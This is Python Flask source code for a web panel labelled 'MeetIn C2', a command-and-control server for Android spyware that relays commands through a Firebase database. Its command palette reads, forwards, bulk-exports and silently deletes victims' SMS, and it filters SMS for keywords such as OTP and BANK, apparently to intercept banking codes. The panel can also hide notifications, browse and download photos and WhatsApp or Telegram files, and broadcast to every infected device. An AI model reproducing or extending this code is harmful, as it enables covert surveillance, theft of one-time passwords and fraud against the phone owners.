from flask import Flask, render_template_string, request
import requests
import time
import os

app = Flask(__name__)

FIREBASE_URL = "https://meetin-3e70e-default-rtdb.firebaseio.com"

COMMAND_PALETTE = {
    "Core": [
        ("ping", "Test connection"), ("info", "Full device info"),
        ("device", "Get device ID"), ("apps list", "List user apps"),
        ("exit", "Disconnect device"),
    ],
    "SMS Read": [
        ("sms read", "Read last 5 SMS"), ("sms read 20", "Read last 20 SMS"),
        ("sms read 50", "Read last 50 SMS"), ("sms stats", "SMS count"),
        ("sms log", "Recent SMS log"),
    ],
    "SMS Send / Delete": [
        ("sms send +2348012345678 Hello", "Send SMS (edit number+msg)"),
        ("sms delete", "Delete most recent SMS"), ("sms delete 5", "Delete last 5 SMS"),
        ("sms bulk export", "Export last 100 SMS"), ("sms bulk export 500", "Export last 500 SMS"),
    ],
    "Stealth / Silent": [
        ("stealth on", "Hide app notification"), ("stealth off", "Show app notification"),
        ("sms silent on", "No SMS notifications"), ("sms silent off", "SMS notifications on"),
    ],
    "Auto-Delete": [
        ("sms autodelete on", "Auto-delete after forward"), ("sms autodelete off", "Keep in inbox"),
        ("sms forward-delete on", "Delete immediately on forward"), ("sms forward-delete off", "Keep SMS after forward"),
    ],
    "Keyword Filter": [
        ("sms keywords add OTP,BANK,VERIFY", "Filter by keywords"),
        ("sms keywords clear", "Clear keyword filter"),
    ],
    "Whitelist": [
        ("sms whitelist add +2348012345678", "Only from this number"),
        ("sms whitelist clear", "Clear whitelist"),
    ],
    "Blacklist": [
        ("sms blacklist add +2349087654321", "Ignore this number"),
        ("sms blacklist clear", "Clear blacklist"),
    ],
    "Time Window": [
        ("sms time 09:00 17:00", "Only intercept work hours"),
        ("sms time 09:00 18:00", "Only intercept 9-6"),
        ("sms time clear", "24/7 interception"),
    ],
    "Auto-Reply": [
        ("sms auto-reply Thanks for your message!", "Set auto-reply"),
        ("sms auto-reply delay 5000", "5-second delay"),
        ("sms auto-reply delay 0", "No delay"),
    ],
    "Admin / Remote": [
        ("sms admin set +2348012345678", "Set admin number"),
        ("sms forward +2349087654321", "Forward all SMS to number"),
    ],
    "Queue": [
        ("sms queue", "Show queued SMS"), ("sms queue clear", "Clear queue"),
    ],
    "Multi-SIM": [
        ("sms sim 1", "Use SIM 1"), ("sms sim 2", "Use SIM 2"),
    ],
    "Backup": [
        ("sms backup", "Backup all SMS"),
    ],
    "Storage Discovery": [
        ("storage", "Show storage paths on this device"),
    ],
    "Browse Files": [
        ("ls", "List root storage"), ("ls dcim", "Camera photos"),
        ("ls screenshots", "Screenshots"), ("ls downloads", "Downloads folder"),
        ("ls pictures", "Pictures"), ("ls music", "Music files"),
        ("ls videos", "Videos"), ("ls documents", "Documents"),
        ("ls whatsapp", "WhatsApp files"), ("ls telegram", "Telegram files"),
        ("ls android", "Android folder"),
    ],
    "Download": [
        ("get dcim/photo.jpg", "Download a photo"),
        ("get downloads/file.pdf", "Download a file"),
        ("get whatsapp/Media/WhatsApp Images/img.jpg", "Download WhatsApp image"),
    ],
}

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>MeetIn C2 Web Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { box-sizing: border-box; }
        body { font-family: -apple-system, Arial, sans-serif; max-width: 1100px; margin: 20px auto; padding: 15px; background: #f0f2f5; }
        h1 { color: #1a1a1a; margin-bottom: 5px; }
        h2 { color: #333; margin-top: 25px; border-bottom: 2px solid #007bff; padding-bottom: 5px; }
        .subtitle { color: #666; font-size: 14px; margin-bottom: 20px; }
        input[type=text], select { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 6px; font-size: 16px; }
        button { padding: 12px 24px; background: #007bff; color: white; border: none; cursor: pointer; border-radius: 6px; font-size: 16px; font-weight: bold; }
        button:hover { background: #0056b3; }
        .device-card { background: white; padding: 12px; margin: 8px 0; border-radius: 6px; border-left: 4px solid #28a745; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
        .device-card.offline { border-left-color: #dc3545; }
        .device-id { font-family: monospace; font-size: 14px; color: #333; }
        .status { font-size: 12px; font-weight: bold; padding: 3px 8px; border-radius: 10px; }
        .status.online { background: #d4edda; color: #155724; }
        .status.offline { background: #f8d7da; color: #721c24; }
        .response-box { background: white; padding: 15px; margin: 10px 0; border-radius: 6px; border-left: 4px solid #007bff; }
        .response-device { font-weight: bold; color: #007bff; margin-bottom: 8px; font-size: 14px; }
        .response-content { white-space: pre-wrap; font-family: monospace; font-size: 13px; color: #333; background: #f8f9fa; padding: 10px; border-radius: 4px; max-height: 400px; overflow-y: auto; }
        .response-meta { font-size: 12px; color: #666; margin-bottom: 5px; }
        .empty { color: #999; font-style: italic; }
        .badge { display: inline-block; background: #007bff; color: white; padding: 2px 8px; border-radius: 10px; font-size: 12px; margin-left: 8px; }
        .palette { background: white; padding: 15px; border-radius: 6px; margin-top: 15px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
        .palette-search { width: 100%; padding: 10px; margin-bottom: 12px; border: 2px solid #007bff; border-radius: 6px; font-size: 14px; }
        .category { margin-bottom: 18px; }
        .category-title { font-weight: bold; color: #495057; font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 8px; padding-bottom: 4px; border-bottom: 1px dashed #dee2e6; }
        .cmd-btn { display: inline-block; padding: 7px 12px; margin: 4px 4px 4px 0; background: #e9ecef; color: #212529; border: 1px solid #ced4da; border-radius: 5px; font-size: 13px; font-family: monospace; cursor: pointer; transition: all 0.15s; }
        .cmd-btn:hover { background: #007bff; color: white; transform: translateY(-1px); box-shadow: 0 2px 4px rgba(0,123,255,0.3); }
        .cmd-btn.danger { background: #fff3cd; border-color: #ffc107; }
        .cmd-btn.danger:hover { background: #dc3545; color: white; border-color: #dc3545; }
        .file-download { display: inline-block; padding: 10px 20px; background: #28a745; color: white; text-decoration: none; border-radius: 6px; font-weight: bold; margin: 10px 0; }
        .file-download:hover { background: #218838; }
    </style>
</head>
<body>
    <h1>MeetIn C2 Web Panel</h1>
    <div class="subtitle">Multi-device Command & Control</div>

    <h2>Connected Devices <span class="badge">{{ devices|length }}</span></h2>
    <div>
        {% if devices_html %}{{ devices_html | safe }}{% else %}<p class="empty">No devices connected.</p>{% endif %}
    </div>

    <h2>Send Command</h2>
    <form method="POST">
        <label><strong>Target:</strong></label>
        <select name="device_id" required>
            <option value="__ALL__">🚀 ALL DEVICES (Broadcast)</option>
            {% for device in devices %}<option value="{{ device }}" {% if device == last_target %}selected{% endif %}>{{ device }}</option>{% endfor %}
        </select>
        <label><strong>Command:</strong></label>
        <input type="text" name="command" id="commandInput" placeholder="Click a command below or type here..." required autocomplete="off">
        <br><br>
        <button type="submit">Send Command</button>
    </form>

    <div class="palette">
        <h3 style="margin-top: 0;">📋 Command Palette <span style="font-size: 13px; color: #666; font-weight: normal;">(tap to auto-fill)</span></h3>
        <input type="text" class="palette-search" id="paletteSearch" placeholder="🔍 Search commands..." oninput="filterCommands()">
        <div id="commandPalette">
            {% for category, commands in palette.items() %}
            <div class="category" data-category="{{ category }}">
                <div class="category-title">{{ category }}</div>
                {% for cmd, desc in commands %}
                <span class="cmd-btn {% if 'delete' in cmd or 'clear' in cmd or 'exit' in cmd %}danger{% endif %}"
                      onclick="fillCommand('{{ cmd }}')" data-cmd="{{ cmd }}" data-desc="{{ desc }}" title="{{ desc }}">{{ cmd }}</span>
                {% endfor %}
            </div>
            {% endfor %}
        </div>
    </div>

    <h2>Last Response{% if last_target %} — {{ last_target }}{% endif %}</h2>
    {% if responses %}{{ responses | safe }}{% else %}<p class="empty">No response yet.</p>{% endif %}

    <script>
        function fillCommand(cmd) {
            const input = document.getElementById('commandInput');
            input.value = cmd;
            input.focus();
            input.scrollIntoView({behavior: 'smooth', block: 'center'});
        }
        function filterCommands() {
            const query = document.getElementById('paletteSearch').value.toLowerCase();
            document.querySelectorAll('.category').forEach(cat => {
                let visibleCount = 0;
                cat.querySelectorAll('.cmd-btn').forEach(btn => {
                    const match = btn.getAttribute('data-cmd').toLowerCase().includes(query) || btn.getAttribute('data-desc').toLowerCase().includes(query);
                    btn.style.display = match ? '' : 'none';
                    if (match) visibleCount++;
                });
                cat.style.display = visibleCount > 0 ? '' : 'none';
            });
        }
    </script>
</body>
</html>
"""

def format_bytes(b):
    try: b = int(b)
    except: return "?"
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if b < 1024: return f"{b:.1f} {unit}"
        b /= 1024
    return f"{b:.1f} PB"

def fetch_devices():
    try:
        r = requests.get(f"{FIREBASE_URL}/devices.json", timeout=10)
        if r.status_code == 200 and r.json(): return r.json()
    except Exception: pass
    return {}

def build_devices_html(devices_data):
    if not devices_data: return ""
    html = ""
    for device_id, device in devices_data.items():
        info = device.get("info", {})
        storage = device.get("storage", {})
        is_online = info.get("online", False)
        model, brand = info.get("model", "?"), info.get("brand", "")
        last_seen = info.get("last_seen", 0)
        free_str = format_bytes(storage.get("primary_free", 0)) if storage else "?"
        total_str = format_bytes(storage.get("primary_total", 0)) if storage else "?"
        status_class = "online" if is_online else "offline"
        status_text = "ONLINE" if is_online else "OFFLINE"
        card_class = "" if is_online else "offline"
        last_seen_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(last_seen / 1000)) if last_seen else "?"
        html += f'<div class="device-card {card_class}"><div class="device-id">📱 {device_id}</div><div style="margin-top:5px;font-size:13px;color:#666;">{brand} {model} &nbsp;|&nbsp; Last seen: {last_seen_str} <span class="status {status_class}">{status_text}</span></div><div style="margin-top:4px;font-size:12px;color:#888;">💾 {free_str} free of {total_str}</div></div>'
    return html

def send_command_to_device(device_id, command):
    try:
        cmd_id = str(int(time.time() * 1000))
        requests.put(f"{FIREBASE_URL}/devices/{device_id}/commands/{cmd_id}.json", json=command, timeout=10)
        return cmd_id
    except Exception: return None

def fetch_latest_response(device_id, command, max_wait=8):
    deadline = time.time() + max_wait
    while time.time() < deadline:
        try:
            r = requests.get(f"{FIREBASE_URL}/devices/{device_id}/responses.json", timeout=5)
            if r.status_code == 200 and r.json():
                for key, value in sorted(r.json().items(), key=lambda x: x[0], reverse=True):
                    if not value.startswith("DEVICE:"): return value
        except Exception: pass
        time.sleep(1)
    return "(no response yet)"

def build_responses_html(response_list):
    html = ""
    for device_id, response in response_list:
        if response.startswith("FILE_BEGIN|"):
            try:
                parts = response.split("|", 3)
                filename, filesize, b64_data = parts[1], int(parts[2]), parts[3].replace("|FILE_END", "")
                size_str = format_bytes(filesize)
                html += f'<div class="response-box" style="border-left-color:#28a745;"><div class="response-device">📱 {device_id}</div><div class="response-meta">File: {filename} ({size_str})</div><div style="padding:10px;"><a href="data:application/octet-stream;base64,{b64_data}" download="{filename}" class="file-download">⬇️ Download {filename}</a></div></div>'
                continue
            except Exception: pass
        escaped = response.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        html += f'<div class="response-box"><div class="response-device">📱 {device_id}</div><div class="response-meta">Received: {time.strftime("%H:%M:%S")}</div><div class="response-content">{escaped}</div></div>'
    return html

@app.route('/health')
def health(): return "OK", 200

@app.route('/', methods=['GET', 'POST'])
def index():
    devices_data = fetch_devices()
    devices = list(devices_data.keys())
    devices_html = build_devices_html(devices_data)
    last_target = ""
    responses_html = ""
    if request.method == 'POST':
        target, command = request.form.get('device_id'), request.form.get('command')
        if target and command:
            last_target = target
            response_list = []
            if target == "__ALL__":
                for device_id in devices: send_command_to_device(device_id, command)
                time.sleep(5)
                for device_id in devices: response_list.append((device_id, fetch_latest_response(device_id, command, max_wait=5)))
            else:
                if send_command_to_device(target, command): response_list.append((target, fetch_latest_response(target, command, max_wait=10)))
            responses_html = build_responses_html(response_list)
    return render_template_string(HTML_TEMPLATE, devices=devices, devices_html=devices_html, responses=responses_html, last_target=last_target, palette=COMMAND_PALETTE)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
